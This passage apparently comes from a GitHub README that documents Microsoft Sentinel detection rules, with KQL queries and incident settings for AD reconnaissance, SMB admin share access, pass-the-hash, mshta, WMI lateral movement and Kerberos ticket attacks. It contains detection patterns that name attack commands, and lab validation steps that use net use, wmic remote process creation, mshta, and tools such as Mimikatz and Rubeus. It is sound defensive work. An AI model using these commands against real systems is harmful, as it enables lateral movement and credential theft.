* The `Process` field matches one of the targeted reconnaissance tools: `"systeminfo.exe"`, `"hostname.exe"`, `"wmic.exe"`, or `"ver.exe"`.
* The NRT rule successfully processes the incoming event stream.

---

## 📋 Incident Configuration
To govern how alerts manifest in the SOC queue, Microsoft Sentinel is configured with the following settings:
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account** and **Host (Name)**.

### Why group alerts by Account and Host?
Attackers rarely run just one discovery command. They typically execute a quick succession of commands to gather system details, network routes, and domain configurations. By grouping these alerts by the Host and Account over a 5-hour window, the SOC receives a single incident containing the entire chain of reconnaissance commands, rather than being bombarded by multiple fragmented tickets.

---

## ✅ Validation
This detection can be validated by opening a standard Command Prompt on a monitored endpoint and executing the commands manually:
`systeminfo`
`hostname`
`wmic process list`
Microsoft Sentinel will instantly detect the 4688 process creation events, generate alerts for each command, and roll them into a single consolidated incident.

---

## 🎯 Security Impact
This detection helps security teams:
* Gain an early warning signal of a successful breach, often before lateral movement or data exfiltration occurs.
* Identify the exact time frame an attacker gained interactive access to a system.
* Determine the scope of the attacker's knowledge about the environment based on the specific commands executed.

---

## 📸 Screenshots

### Rule Overview
> *(Insert Screenshot 2026-08-03 122433.png)*

### MITRE ATT&CK Mapping
> *(Insert Screenshot 2026-08-03 122445.png)*

### KQL Query
> *(Insert Screenshot 2026-08-03 122453.png)*

### Entity Mapping
> *(Insert Screenshot 2026-08-03 122522.png)*

### Incident Settings
> *(Insert Screenshot 2026-08-03 122550.png)*

### Automation Rule
> *(Insert Screenshot 2026-08-03 122556.png)*

### Review & Create
> *(Insert Screenshot 2026-08-03 122604.png)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---

# 🗺️ Active Directory Computer Enumeration Detected

## 🎯 Objective
This rule detects the execution of commands commonly used for Active Directory reconnaissance, specifically targeting computer object enumeration. It enables security teams to identify threat actors attempting to map the domain environment, often as a precursor to lateral movement or privilege escalation.

---

## 📖 Threat Overview
Once adversaries establish a foothold in an Active Directory environment, they need to understand the network layout to find valuable targets (like Domain Controllers, File Servers, or Exchange Servers). Tools like SharpHound/BloodHound or built-in PowerShell cmdlets like `Get-ADComputer` are frequently used to dump massive amounts of directory data. Monitoring process execution for these specific cmdlets is a critical capability for detecting the reconnaissance phase of an attack lifecycle.

---

## 🔥 Severity
**Medium**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Discovery | Remote System Discovery | T1018 |
| Discovery | Permission Groups Discovery | T1069 |
| Discovery | Account Discovery | T1087 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4688 - Process Creation)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors process creation logs for the specific `Get-ADComputer` PowerShell cmdlet:

```kql
SecurityEvent
| where EventID == 4688
| where isnotempty(CommandLine)
| where CommandLine has "Get-ADComputer"
| project
    TimeGenerated,
    Computer,
    Account,
    NewProcessName,
    ParentProcessName,
    CommandLine,
    ProcessId
| order by TimeGenerated desc
```

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect Active Directory enumeration the moment it begins. |
| **Severity** | Medium | Administrators occasionally run AD queries, requiring context to determine if the activity is malicious. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual query to determine the full scope of the enumeration. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Alert Enhancement

### Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Account |
| Host | HostName | Computer |
| Process | CommandLine | CommandLine |

### Custom Details
The following parameters have been surfaced directly into the alerts for faster triage:
* **Process:** `NewProcessName`
* **ParentProcess:** `ParentProcessName`

### Why map these entities & details?
* **Account & Host:** Identifies the compromised user and endpoint being used as a staging ground for the AD scan.
* **Process / Parent Process:** Mapping the executing process and its parent allows analysts to quickly spot suspicious execution chains (e.g., `cmd.exe` spawning `powershell.exe` to run the query).

---

## 🔄 Detection Workflow
```text
Attacker runs SharpHound or PowerShell to query AD computers
            │
            ▼
Windows Security Log (Event ID 4688) generated on the endpoint
            │
            ▼
Azure Monitor Agent (AMA) ingests the event
            │
            ▼
Microsoft Sentinel NRT Analytics Rule evaluates incoming events
            │
            ▼
CommandLine matches "Get-ADComputer"
            │
            ▼
Alert Generated (Custom details attached)
            │
            ▼
Incident Created (Grouped by Account and Host)
            │
            ▼
SOC Analyst Assigned & Lateral Movement Prevention Initiated
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** is generated.
* The `CommandLine` field is not empty and contains the string `"Get-ADComputer"`.
* The NRT rule successfully processes the incoming event stream.

---

## 📋 Incident Configuration
To govern how alerts manifest in the SOC queue, Microsoft Sentinel is configured with the following settings:
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account** and **Host (Name)**.

### Why group alerts by Account and Host?
AD enumeration tools often execute hundreds of queries iteratively. By grouping alerts based on the specific Host and Account over a 5-hour window, the SOC receives a single consolidated incident containing the entire reconnaissance session, effectively preventing alert fatigue.

---

## ✅ Validation
This detection can be validated by opening a PowerShell prompt on a monitored endpoint (which has the ActiveDirectory module installed) and running the command:
`Get-ADComputer -Filter *`
Microsoft Sentinel will instantly detect the process creation event containing the cmdlet, generate an alert, and create the consolidated incident.

---

## 🎯 Security Impact
This detection helps security teams:
* Identify internal reconnaissance immediately, providing a crucial window to respond before the attacker moves laterally.
* Pinpoint compromised identities that are actively probing the directory.
* Understand the attacker's objectives based on the specific AD objects they are querying.

---

## 📸 Screenshots

### Rule Overview
> *(Insert Screenshot 2026-08-03 164346.png)*

### MITRE ATT&CK Mapping
> *(Insert Screenshot 2026-08-03 164410.png)*

### KQL Query
> *(Insert Screenshot 2026-08-03 164453.png)*

### Entity Mapping & Custom Details
> *(Insert Screenshot 2026-08-03 164505.png)*
> *(Insert Screenshot 2026-08-03 164515.png)*

### Incident Settings
> *(Insert Screenshot 2026-08-03 164539.png)*

### Automation Rule
> *(Insert Screenshot 2026-08-03 164547.png)*

### Review & Create
> *(Insert Screenshot 2026-08-03 164554.png)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 📁 SMB Admin Share Access

## 🎯 Objective
This rule detects unauthorized access to administrative Server Message Block (SMB) shares, such as `C$`, `ADMIN$`, and `IPC$`. It alerts security teams to potential lateral movement attempts where attackers drop payloads or execute remote commands.

---

## 📖 Threat Overview
Administrative shares (`C$`, `ADMIN$`, `IPC$`) are hidden network shares intended for system administrators to manage remote endpoints. Threat actors leverage these shares extensively with tools like PsExec, Impacket, or custom scripts to transfer malicious payloads, access the remote Service Control Manager, and execute commands across the domain.

---

## 🔥 Severity
**High**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 5140, 5145)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
```kql
SecurityEvent
| where EventID in (5140, 5145)
| where ShareName has_any ("\\\\*\\ADMIN$", "\\\\*\\C$", "\\\\*\\IPC$")
| project
    TimeGenerated,
    Computer,
    Account,
    IpAddress,
    ShareName,
    RelativeTargetName
| order by TimeGenerated desc
```

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect lateral file transfers instantly. |
| **Severity** | High | Unauthorized access to admin shares is a primary vector for remote code execution. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every distinct share access attempt. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |
| IP | Address | IpAddress |

### Why map these entities?
* **Host:** Identifies the target endpoint whose admin share was accessed.
* **Account & IP:** Details the compromised identity and the network origin of the attacker initiating the SMB connection.

---

## 🔄 Detection Workflow
```text
Attacker maps an SMB Admin Share (e.g., \\Server\C$)
            │
            ▼
Windows Security Log (Event ID 5140/5145) generated
            │
            ▼
Azure Monitor Agent (AMA) ingests the event
            │
            ▼
Microsoft Sentinel NRT Analytics Rule evaluates incoming events
            │
            ▼
ShareName matches "ADMIN$", "C$", or "IPC$"
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (Grouped by Account and Host)
            │
            ▼
SOC Analyst Assigned to track lateral movement
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **5140** (A network share object was accessed) or **5145** (A network share object was checked to see whether client can be granted desired access) is logged.
* The `ShareName` contains references to the hidden administrative shares.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account** and **Host (Name)**.

### Why group alerts by Account and Host?
Attackers using tools like Impacket will trigger multiple 5140/5145 events rapidly as they authenticate, map the IPC$ share to create a named pipe, map the ADMIN$ share to drop a binary, and execute. Grouping by Account and Host consolidates the entire tactical sequence into one incident.

---

## ✅ Validation
This detection can be validated by mapping an administrative share from one machine to another using standard Windows commands (e.g., `net use \\TargetMachine\C$ /user:Domain\AdminUser Password`). Microsoft Sentinel will detect the 5140/5145 events and generate an incident.

---

## 🎯 Security Impact
This detection helps security teams:
* Identify automated lateral movement tools propagating across the network.
* Intercept the delivery stage of ransomware or remote access trojans (RATs).
* Enforce least privilege by identifying non-administrative accounts gaining access to administrative shares.

---

## 📸 Screenshots

### Rule Overview
> *(Insert Screenshot 2026-08-03 174034.png)*

### MITRE ATT&CK Mapping
> *(Insert Screenshot 2026-08-03 174046.png)*

### KQL Query
> *(Insert Screenshot 2026-08-03 174057.png)*

### Entity Mapping
> *(Insert Screenshot 2026-08-03 174106.png)*

### Incident Settings
> *(Insert Screenshot 2026-08-03 174115.png)*

### Automation Rule
> *(Insert Screenshot 2026-08-03 174120.png)*

### Review & Create
> *(Insert Screenshot 2026-08-03 174127.png)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**
---

# 🔑 Pass-the-Hash Detection

## 🎯 Objective
This rule detects authentication attempts utilizing stolen NTLM password hashes instead of plaintext passwords. It enables security teams to identify lateral movement and credential abuse across the network.

---

## 📖 Threat Overview
Pass-the-Hash (PtH) is a lateral movement technique where an attacker extracts an NTLM hash from a compromised system's memory (often using tools like Mimikatz) and uses it to authenticate to other network resources without ever needing the user's actual plaintext password. Monitoring for Network logons (Logon Type 3) specifically utilizing the NTLM authentication package is a crucial method for identifying this legacy protocol abuse.

---

## 🔥 Severity
**High**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Lateral Movement | Use Alternate Authentication Material: Pass the Hash | T1550.002 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4624 - Successful Logon)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
```kql
SecurityEvent
| where EventID == 4624
| where LogonType == 3
| where AuthenticationPackageName == "NTLM"
| project
    TimeGenerated,
    Computer,
    Account,
    IpAddress,
    LogonType,
    AuthenticationPackageName
```

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect hash-based authentication anomalies immediately. |
| **Severity** | High | Successful PtH attacks indicate a severe breach of credential boundaries. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual NTLM logon anomaly. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |
| IP | Address | IpAddress |

### Why map these entities?
* **Account:** Identifies whose compromised hash is being utilized.
* **Host & IP:** Highlights the targeted endpoint and traces the network origin of the PtH attack.

---

## 🔄 Detection Workflow
```text
Attacker utilizes a stolen NTLM hash to authenticate over the network
            │
            ▼
Windows Security Log (Event ID 4624, Logon Type 3, NTLM) generated
            │
            ▼
Azure Monitor Agent (AMA) ingests the event
            │
            ▼
Microsoft Sentinel NRT Analytics Rule evaluates incoming events
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (Grouped by IP and Account)
            │
            ▼
SOC Analyst Assigned & Account Isolation Initiated
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4624** is logged.
* The `LogonType` is **3** (Network).
* The `AuthenticationPackageName` is exactly **"NTLM"**.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **IP** and **Account (Name)**.

### Why group alerts by IP and Account?
In enterprise environments, legitimate legacy systems may still use NTLM. By grouping alerts by the source IP Address and the Account, the SOC receives a single consolidated incident representing a PtH campaign, preventing massive alert fatigue from repetitive network authentications.

---

## ✅ Validation
This detection can be validated by utilizing a tool like Mimikatz or CrackMapExec in a controlled lab environment to execute a Pass-the-Hash attack against a target server. Microsoft Sentinel will detect the resulting Event ID 4624 (Logon Type 3, NTLM) and generate an incident.

---

## 🎯 Security Impact
This detection helps security teams:
* Identify adversaries bypassing plaintext password requirements.
* Flag legacy protocol usage that requires hardening or Kerberos enforcement.
* Map the lateral movement path of an attacker originating from a specific IP address.

---

## 📸 Screenshots

### Rule Overview & Incident Settings
> *(Insert related video screenshots and image_722ddc.png here)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---

# 📜 Mshta Execution

## 🎯 Objective
This rule detects the execution of `mshta.exe`. It enables security teams to identify adversaries attempting to execute malicious scripts while bypassing application control solutions.

---

## 📖 Threat Overview
`mshta.exe` is a native Windows utility that executes Microsoft HTML Application (HTA) files. Because it is a signed, legitimate Microsoft binary, threat actors frequently abuse it to proxy the execution of malicious VBScript or JScript payloads. This "Living off the Land" technique effectively bypasses application whitelisting defenses (like AppLocker) and often evades endpoint detection.

---

## 🔥 Severity
**High**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Defense Evasion | System Binary Proxy Execution: Mshta | T1218.005 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4688 - Process Creation)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
```kql
SecurityEvent
| where EventID == 4688
| where Process has "mshta.exe"
| project TimeGenerated, Computer, Account, Process, CommandLine
```

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect proxy execution as soon as it occurs. |
| **Severity** | High | `mshta.exe` is rarely used in modern legitimate environments; its presence is highly suspicious. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual instance of Mshta execution. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |
| Process | CommandLine | CommandLine |

### Why map these entities?
* **Account & Host:** Identifies the compromised user and the targeted endpoint where the defense evasion is taking place.
* **Process:** Extracts the exact `CommandLine` arguments, which usually contain the malicious URL or the embedded script payload being passed to `mshta.exe`.

---

## 🔄 Detection Workflow
```text
Attacker uses mshta.exe to execute a malicious script payload
            │
            ▼
Windows Security Log (Event ID 4688) generated
            │
            ▼
Azure Monitor Agent (AMA) ingests the event
            │
            ▼
Microsoft Sentinel NRT Analytics Rule evaluates incoming events
            │
            ▼
Process matches "mshta.exe"
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (Grouped by Account and Host)
            │
            ▼
SOC Analyst Assigned & Payload Deobfuscation Initiated
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** is generated.
* The `Process` field contains `"mshta.exe"`.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account** and **Host (Name)**.

### Why group alerts by Account and Host?
If a malicious macro or dropper repeatedly attempts to call `mshta.exe` to pull down secondary payloads, grouping by the targeted host and account prevents the SOC queue from flooding and encapsulates the entire infection chain into one ticket.

---

## ✅ Validation
This detection can be validated by opening a Command Prompt on a monitored endpoint and executing a benign HTA command, such as `mshta.exe vbscript:Close(Execute("MsgBox ""Test Sentinel Alert"""))`. Microsoft Sentinel will instantly detect the process creation event containing `mshta.exe`, generate an alert, and create the consolidated incident.

---

## 🎯 Security Impact
This detection helps security teams:
* Spot defense evasion techniques designed to bypass AppLocker or standard application whitelisting.
* Extract malicious URLs or script contents passed through the `CommandLine`.
* Identify the initial execution phase of fileless malware infections.

---

## 📸 Screenshots

### Rule Overview & Configuration
> *(Insert related video screenshots here)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---


# ⚙️ WMI Lateral Movement Detection

## 🎯 Objective
This rule detects the execution of commands via Windows Management Instrumentation (WMI) across the network. It alerts defenders to attackers utilizing native management protocols to execute processes on remote systems.

---

## 📖 Threat Overview
WMI is a built-in framework for management and operations on Windows systems. Adversaries frequently abuse WMI (specifically `wmic.exe` or PowerShell WMI cmdlets) because it operates over the network transparently, generates less noise than traditional PSExec methods, and does not require dropping an executable file to disk to execute commands (fileless execution). It is a favored technique for stealthy lateral movement.

---

## 🔥 Severity
**High**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Execution | Windows Management Instrumentation | T1047 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4688 - Process Creation)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
```kql
SecurityEvent
| where EventID == 4688
| where NewProcessName has_any ("wmic.exe", "WmiPrvSE.exe")
   or Process has "wmi"
   or CommandLine has_any ("process call create", "/node:", "win32_process")
| project
    TimeGenerated,
    Computer,
    Account,
    NewProcessName,
    CommandLine,
    ParentProcessName
| order by TimeGenerated desc
```

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to spot lateral execution payloads as they launch. |
| **Severity** | High | WMI remote process creation (`process call create`) is a highly suspicious indicator of compromise. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual WMI process creation event. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Account |
| Host | HostName | Computer |
| Process | CommandLine | CommandLine |

### Why map these entities?
* **Account:** Identifies the privileged account used to establish the WMI connection.
* **Host:** Identifies the target system executing the payload.
* **Process:** The `CommandLine` reveals the exact malicious instruction the attacker passed to the `Win32_Process` class for execution.

---

## 🔄 Detection Workflow
```text
Attacker uses WMI to spawn a process on a remote machine
            │
            ▼
Target Host logs Event ID 4688 (e.g., WmiPrvSE.exe spawning cmd.exe)
            │
            ▼
Azure Monitor Agent (AMA) ingests the event
            │
            ▼
Microsoft Sentinel NRT Analytics Rule evaluates incoming events
            │
            ▼
Command matches "process call create" or WMI binaries
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (Grouped by Account and Host)
            │
            ▼
SOC Analyst Assigned & Process Tree Investigation Initiated
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** is generated.
* The execution matches WMI binaries (`wmic.exe`, `WmiPrvSE.exe`), or the command line contains specific WMI execution parameters (`process call create`, `win32_process`).

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account** and **Host (Name)**.

### Why group alerts by Account and Host?
Attackers rarely use WMI against a single machine; they often loop through a list of endpoints using compromised credentials to rapidly deploy backdoors. Grouping by Account and Host consolidates these repeated bursts of lateral movement into a single incident per compromised identity and endpoint, drastically reducing SOC queue noise.

---

## ✅ Validation
This detection can be validated by opening a Command Prompt with administrative privileges and executing a remote WMI call against another monitored machine in the lab:
`wmic /node:192.168.1.50 process call create "cmd.exe /c echo WMITest"`
Microsoft Sentinel will detect the 4688 event containing the WMI parameters and generate the consolidated incident.

---

## 🎯 Security Impact
This detection helps security teams:
* Uncover fileless lateral movement techniques that bypass traditional antivirus.
* Track the exact payload execution parameters utilized by the adversary.
* Identify compromised infrastructure where attackers are abusing native system management tools to maintain stealth.

---

## 📸 Screenshots

### Rule Overview & Configuration
> *(Insert related video screenshots here)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 🎟️ Potential Pass-the-Ticket Activity

## 🎯 Objective
This rule detects suspicious Kerberos ticket usage followed by a successful network logon. It enables security teams to identify potential "Pass-the-Ticket" (PtT) attacks, where adversaries use stolen Kerberos tickets to authenticate to network resources.

---

## 📖 Threat Overview
In a Pass-the-Ticket attack, an adversary steals a valid Kerberos Ticket Granting Ticket (TGT) or Service Ticket (TGS) from a compromised system's memory (e.g., using Mimikatz or Rubeus). They then inject this ticket into their own session to access network resources without needing the user's password. This detection looks for the temporal anomaly of a Kerberos ticket request followed almost immediately by a successful network logon utilizing that ticket.

---

## 🔥 Severity
**High**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Lateral Movement | Use Alternate Authentication Material: Pass the Ticket | T1550.003 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event IDs 4768, 4770, 4624)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
```kql
let KerberosTickets =
SecurityEvent
| where EventID in (4768, 4770)
| project TicketTime=TimeGenerated,
  Account=TargetUserName,
  ServiceName,
  Computer;
let Successfullogons =
SecurityEvent
| where EventID == 4624
| where LogonType in (3, 9)
| project LogonTime=TimeGenerated,
  Account=TargetUserName,
  IpAddress,
  Computer,
  LogonType,
  AuthenticationPackageName;
KerberosTickets
| join kind=inner Successfullogons on Account
| where LogonTime between (TicketTime .. (TicketTime + 5m))
| project
  LogonTime,
  Computer,
  Account,
  IpAddress,
  ServiceName,
  LogonType
| order by LogonTime desc
```

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect identity-based lateral movement in real time. |
| **Severity** | High | Kerberos ticket abuse indicates a severe breach of domain identity boundaries. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual instance of correlated ticket abuse. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Alert Enhancement

### Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |
| IP | Address | IpAddress |

### Custom Details
The following parameters have been surfaced directly into the alerts for faster triage:
* **SourceIp:** `IpAddress`
* **TargetHost:** `Computer`
* **ServiceName:** `ServiceName`
* **LogonType:** `LogonType`

---

## 🔄 Detection Workflow
```text
Attacker injects a stolen Kerberos ticket and accesses a remote share
            │
            ▼
Domain Controller logs Ticket Events (4768/4770) and Logon (4624)
            │
            ▼
Azure Monitor Agent (AMA) ingests the events
            │
            ▼
Microsoft Sentinel NRT Analytics Rule correlates the events within a 5-minute window
            │
            ▼
Alert Generated (Custom details attached)
            │
            ▼
Incident Created (No alert grouping)
            │
            ▼
SOC Analyst Assigned & Identity Revocation Initiated
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* A Kerberos ticket event (**4768** or **4770**) is logged.
* A successful network logon event (**4624**, Logon Type **3** or **9**) occurs for the same `TargetUserName` within **5 minutes** of the ticket event.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Pass-the-Ticket represents an advanced, high-severity threat. The volume of true positive alerts will be extremely low. Generating a distinct incident for every occurrence ensures immediate, highly focused attention from the SOC without the risk of the alert being buried or delayed by grouping windows.

---

## ✅ Validation
This detection can be validated by utilizing a tool like Rubeus in a controlled lab environment to request a TGT and immediately inject it to authenticate to a target file share. Microsoft Sentinel will correlate the 4768/4770 events with the subsequent 4624 event and generate an incident.

---

## 🎯 Security Impact
This detection helps security teams:
* Identify advanced adversaries bypassing standard authentication controls.
* Spot stolen identities being used to traverse the network.
* Map the trajectory of an attacker using the surfaced `SourceIp` and `TargetHost` details.

---

## 📸 Screenshots

### Rule Overview & Configuration
> *(Insert related video screenshots here)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**


---
# 🍖 AS-REP Roasting Detection

## 🎯 Objective
This rule detects potential AS-REP Roasting attacks by monitoring for Kerberos Authentication Service (AS) requests (Event ID 4768) targeting vulnerable accounts. It alerts security teams to adversaries attempting to harvest password hashes for offline cracking.

---

## 📖 Threat Overview
AS-REP Roasting is a credential theft technique targeting Active Directory accounts that have the "Do not require Kerberos preauthentication" attribute enabled. Without preauthentication, an attacker can request an authentication ticket (AS-REP) for the account from the Domain Controller. The Domain Controller responds with a ticket encrypted with the user's password hash, which the attacker can then extract and crack offline to obtain the plaintext password.

---

## 🔥 Severity
**High**
<img width="1920" height="1020" alt="Screenshot 2026-08-03 180707" src="https://github.com/user-attachments/assets/a83b0ca1-f2fb-483f-b4fa-10db64c391d2" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Credential Access | Steal or Forge Kerberos Tickets: AS-REP Roasting | T1558.004 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4768 - A Kerberos authentication ticket (TGT) was requested)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for Kerberos TGT requests targeting a specific vulnerable service account (Note: The `sqlsvc` filter is configured specifically for targeted lab environment detection):

```kql
SecurityEvent
| where EventID == 4768
| where EventData contains "sqlsvc"
| project TimeGenerated, Computer, Account, IpAddress, EventData
```
<img width="1920" height="1020" alt="Screenshot 2026-08-03 180730" src="https://github.com/user-attachments/assets/21f1c585-9968-4c32-958c-3213fac6e345" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect credential access attempts the moment a ticket is requested. |
| **Severity** | High | Successful AS-REP roasting leads directly to offline password cracking and account compromise. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual AS-REP ticket request. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |
| IP | Address | IpAddress |

### Why map these entities?
* **Account:** Identifies the specific vulnerable account (e.g., `sqlsvc`) being targeted for offline cracking.
* **Host:** Highlights the Domain Controller processing the ticket request.
* **IP:** Traces the network origin of the attacker initiating the roasting requests.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 181157" src="https://github.com/user-attachments/assets/76265b5d-5684-494f-ab88-1422097bb4fa" />

---

## 🔄 Detection Workflow
```text
Attacker enumerates accounts without Kerberos pre-auth and requests a TGT
            │
            ▼
Domain Controller logs Event ID 4768 (TGT Requested)
            │
            ▼
Azure Monitor Agent (AMA) ingests the event
            │
            ▼
Microsoft Sentinel NRT Analytics Rule evaluates incoming events
            │
            ▼
EventData contains the targeted vulnerable account ("sqlsvc")
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (Grouped by Source IP)
            │
            ▼
SOC Analyst Assigned & Account Password Reset Initiated
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4768** is logged.
* The `EventData` field contains the specific string `"sqlsvc"` (the targeted vulnerable account).

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
